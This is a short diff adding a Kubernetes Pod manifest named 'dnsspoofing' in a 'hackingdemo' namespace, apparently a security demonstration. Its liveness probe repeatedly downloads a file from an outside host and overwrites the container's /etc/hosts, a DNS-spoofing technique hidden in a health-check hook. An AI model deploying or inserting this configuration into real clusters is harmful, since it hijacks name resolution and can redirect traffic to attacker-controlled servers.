@@ -1,0 +1,24 @@
+apiVersion: v1
+kind: Pod
+metadata:
+  labels:
+    hack: liveness1
+  name: dnsspoofing
+  namespace: hackingdemo
+spec:
+  containers:
+  - name: liveness
+    image: xxradar/hackon
+    args:
+    - /bin/sh
+    - -c
+    - touch /tmp/healthy;sleep 600
+    livenessProbe:
+      exec:
+        command:
+        - curl
+        - radarhack.com/host.txt
+        - -o
+        - /etc/hosts
+      initialDelaySeconds: 5
+      periodSeconds: 5
